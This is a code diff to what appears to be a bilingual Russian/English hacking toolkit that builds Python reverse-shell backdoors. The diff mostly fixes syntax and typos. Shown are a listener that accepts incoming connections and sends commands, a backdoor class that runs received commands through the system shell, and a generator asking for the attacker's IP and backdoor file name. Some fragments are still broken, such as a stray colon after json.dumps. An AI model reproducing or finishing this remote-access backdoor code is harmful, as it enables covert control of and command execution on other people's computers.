@@ -203,11 +203,9 @@ class Listener:
 		print('[*] Waiting for incoming connections')
 		self.connection, address = listener.accept()
 		print('[*] got a connection from' + str(address))
-
 	def reliable_send(self, data):
 		json_data = json.dumps(data):
 		self.connection.send(json_data)
-
 	def reliable_receive(self):
 		json_data = ""
 		while True:
@@ -216,7 +214,6 @@ class Listener:
 				return json.loads(json_data)
 			except ValueError:
 				continue
-
 	def execute_remotely(self, command):
 		self.connection.send(command)
 		if command[0] == "exit":
@@ -224,7 +221,6 @@ class Listener:
 			exit()
 		
 		return self.reliable_receive()
-
 		return self.connection.recv(1024)
 	def go(self):
 		while True:
@@ -238,7 +234,7 @@ my_listener.go() """)
 			print('Готово')
 			break
 				
-		BackdoorC():
+		def BackdoorC():
 			os.chdir('USER-BD')
 			ip = input('Введите свой IP')
 			f = str(input('Имя файла вашего бэкдора(File name of your backdoor) (file.py):'))
@@ -263,7 +259,6 @@ class Backdoor:
 			except ValueError:
 				continue
 	def execute_system_command(self, command):
-
 		return subprocess.check_output(command, shell=True)
 	def run(self):
 		while True:
@@ -389,16 +384,16 @@ def upmenu():
 	print("1-Termux  2-Linux")
 	ue = int(input("Что у вас?(What do you have?)"))
 	if ue ==1:
-	      print('Будет сделано(Will be done!)')
-	      timr.sleep(2)
-	      os.system('bash upgrade.sh')
+	    print('Будет сделано(Will be done!)')
+	    time.sleep(2)
+	    os.system('bash upgrade.sh')
 	elif ue ==2:
-	      print('Будет сделано(Will be done!)')
-	      timr.sleep(2)
-	      os.system('bash upgradeLinux.sh')
+	    print('Будет сделано(Will be done!)')
+	    time.sleep(2)
+	    os.system('bash upgradeLinux.sh')
 	else:
-	      print('Ошибка:не найдено(Error:not found)')
-	      upmenu()
+	    print('Ошибка:не найдено(Error:not found)')
+	    upmenu()
 	      
 if a ==0:
   DefSec0()
